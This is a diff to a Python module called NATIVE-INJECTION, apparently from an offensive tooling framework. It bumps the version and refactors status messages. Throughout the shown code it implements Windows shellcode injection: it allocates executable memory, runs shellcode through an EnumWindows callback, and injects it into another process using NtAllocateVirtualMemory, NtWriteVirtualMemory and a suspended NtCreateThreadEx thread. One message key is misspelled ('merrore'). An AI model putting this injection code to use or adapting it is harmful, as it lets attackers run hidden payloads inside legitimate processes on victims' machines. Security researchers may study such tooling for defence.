@@ -27,7 +27,7 @@ class module:
     import threading
 
     Author = 'psycore8'
-    Version = '0.0.5'
+    Version = '0.0.6'
     DisplayName = 'NATIVE-INJECTION'
     delay = 5
     data_size = 0
@@ -44,23 +44,17 @@ class module:
         self.target_process = process
 
 
-    def msg(self, message_type, ErrorExit=False):
+    def msg(self, message_type, MsgVar=None, ErrorExit=False):
         messages = {
             'pre.head'       : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
-            'error.input'    : f'{nstate.s_fail} File {self.input_file} not found or cannot be opened.', 
-            'error.alloc'    : f'{nstate.s_fail} Error during memory allocation for address 0x{self.nt_error:X}',
-            'error.write'    : f'{nstate.s_fail} Error during memory writing to address 0x{self.nt_error:X}',
-            'error.create'   : f'{nstate.s_fail} Error during thread creation at address 0x{self.nt_error:X}',     
+            'error.input'    : f'{nstate.s_fail} File {self.input_file} not found or cannot be opened.',    
             'post.done'      : f'{nstate.s_ok} DONE!',
             'proc.input_ok'  : f'{nstate.s_ok} File {self.input_file} loaded\n{nstate.s_ok} Size of shellcode {self.data_size} bytes\n{nstate.s_ok} Hash: {self.hash}',
             'proc.input_try' : f'{nstate.s_note} Try to open file {self.input_file}',
             'proc.try'       : f'{nstate.s_note} Try to execute shellcode',
-            'inj.run'        : f'{nstate.s_note} starting {self.target_process}',
-            'inj.pid'        : f'{nstate.s_ok} {self.target_process} process id: {self.pid}',
-            'inj.handle'     : f'{nstate.s_ok} Opened a Handle to the process',
-            'inj.alloc'      : f'{nstate.s_ok} Allocated Memory in the process',
-            'inj.write'      : f'{nstate.s_ok} Wrote The shellcode to memory',
-            'inj.inj_ok'     : f'{nstate.s_ok} Injected the shellcode into the process',
+            'mok'            : f'{nstate.s_ok} {MsgVar}',
+            'mnote'          : f'{nstate.s_note} {MsgVar}',
+            'merror'         : f'{nstate.s_fail} {MsgVar}'
 
         }
         print(messages.get(message_type, f'{message_type} - this message type is unknown'))
@@ -68,24 +62,26 @@ class module:
             exit()
 
     def Start_Process(self):
-        self.msg('inj.run')
+        self.msg('mnote', f'starting {self.target_process}')
         os.system(self.target_process)
 
     def get_proc_id(self):
         processes = self.wmi.WMI().Win32_Process(name=self.target_process)
         self.pid = processes[0].ProcessId
-        self.msg('inj.pid')
+        self.msg('mok', f'{self.target_process} process id: {self.pid}')
         return int(self.pid)
 
     def start_injection(self):
         if self.callback_func:
             mem = VirtualAlloc(0, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
-            print(f'0x{mem:X}')
+            self.msg('mnote', f'Allocated memory address: 0x{mem:X}')
+            #print(f'0x{mem:X}')
             RtlMoveMemory(mem, self.shellcode, len(self.shellcode))
             try:
                 pEnumWindows(mem, 0)
             except:
-                print('Exception handling')
+                #print('Exception handling')
+                self.msg('merror', 'EnumWindows exception!', True)
             exit()
 
         if self.Start_Process:
@@ -98,34 +94,35 @@ class module:
         
         phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
         if phandle:
-            self.msg('inj.handle')
+            self.msg('mok', 'Opened a Handle to the process')
 
         rs = SIZE_T(len(self.shellcode))
         rs_ptr = ctypes.byref(rs)
         memory = pNtAllocateVirtualMemory(phandle, ctypes.byref(base_address), 0, rs_ptr, MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
         if memory == NT_SUCCESS:
-            self.msg('inj.alloc')
+            self.msg('mok', 'Allocated Memory in the process')
         else:
             self.nt_error = memory
-            self.msg('error.alloc')
+            self.msg('merror', f'Error during memory allocation for address 0x{self.nt_error:X}', True)
 
         bs = len(self.shellcode)
         writing = pNtWriteVirtualMemory(phandle, base_address, self.shellcode, bs, None)
         if writing == NT_SUCCESS:
-            self.msg('inj.write')
+            self.msg('mok', 'Wrote The shellcode to memory')
         else:
             self.nt_error = memory
-            self.msg('error.write')
+            self.msg('merror', f'Error during memory writing to address 0x{self.nt_error:X}', True)
         th = HANDLE()
         Injection = pNtCreateThreadEx(ctypes.byref(th), ACCESS_MASK(GENERIC_ALL), None, phandle, base_address, None, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, 0, 0, 0, None)
 
         if Injection == NT_SUCCESS :
-            self.msg('inj.inj_ok')
+            self.msg('mok', 'Injected the shellcode into the process')
         else:
             self.nt_error = memory
-            self.msg('error.create', True)
+            self.msg('merrore', f'Error during thread creation at address 0x{self.nt_error:X}', True)
 
-        print('Thread suspended, waiting 10 seconds...')
+        #print('Thread suspended, waiting 10 seconds...')
+        self.msg('mnote', 'Thread suspended, waiting 10 seconds...')
         self.sleep(10)
 
         suspend_count = ULONG(0)
@@ -133,7 +130,9 @@ class module:
         WaitForSingleObject(th, -1)
 
         if resume == NT_SUCCESS:
-            print('ok')
+            self.msg('mok', 'Injection successful')
+        else:
+            self.msg('merror', 'Injection failed!')
         CloseHandle(phandle)
 
     def proc_inject():
